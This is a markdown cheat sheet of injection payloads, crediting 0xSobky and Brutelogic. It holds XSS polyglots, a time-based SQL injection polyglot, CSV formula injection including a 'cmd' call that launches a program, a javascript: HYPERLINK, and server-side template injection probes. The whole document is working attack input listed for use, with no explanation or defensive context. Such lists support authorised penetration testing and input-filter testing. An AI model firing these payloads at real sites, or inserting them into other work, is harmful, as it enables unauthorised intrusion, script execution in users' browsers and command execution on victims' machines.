# PAYLOADS: Polyglots
## Version: 1.0 | Domain: payloads

---

## CLASSIC XSS POLYGLOT (0xSobky)
```
jaVasCript:/*-/*`/*\\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e
```

## SHORTER POLYGLOTS
```
"><svg/onload=alert(1)>'-alert(1)-'

/*</style></script>"><svg onload=alert(1)>

';alert(1)//\\";alert(1)//"-prompt(1)//\\"-prompt(1)//<svg/onload=alert(1)>
```

## SQLI POLYGLOT
```
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

## XSS + SQLI COMBO
```
'-alert(1)-'<svg/onload=alert(1)>
```

## CSV INJECTION + XSS
```
=cmd|'/c calc'!A1
@SUM(1+1)
=HYPERLINK("javascript:alert(1)","Click")
```

## SSTI MULTI-ENGINE PROBE
```
${{<%[%'"}}%\\
${7*7}{{7*7}}<%=7*7%>#{7*7}*{7*7}@{7*7}
```

## REFLECTED XSS + REDIRECT POLYGLOT
```
javascript:/*--></title></style></textarea></script><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
```

## REFERENCES
0xSobky polyglot research, Brutelogic XSS cheat sheet
